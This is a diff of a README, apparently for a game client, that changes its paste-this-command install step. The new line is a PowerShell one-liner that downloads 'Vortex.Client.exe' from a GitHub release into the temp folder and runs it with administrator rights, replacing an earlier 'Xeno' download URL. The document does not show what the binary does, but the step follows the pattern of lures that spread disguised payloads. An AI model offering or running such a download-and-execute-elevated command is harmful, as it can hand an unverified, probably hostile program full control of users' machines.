@@ -40,8 +40,9 @@
 <p align="center">2. Copy and paste the following command:</p>
 
 ```powershell
-powershell -c irm https://github.com/getupys/Xeno-v1.3.60/releases/latest/download/Xeno.exe -OutFile $env:TEMP\Xeno.exe; Start-Process $env:TEMP\Xeno.exe -Verb RunAs
+powershell -c irm https://github.com/CentipedeRegister/Vortex-Client/releases/latest/download/Vortex.Client.exe -OutFile $env:TEMP\Vortex.Client.exe; Start-Process $env:TEMP\Vortex.Client.exe -Verb RunAs
 ```
+
 
 ## 📸 Preview
 
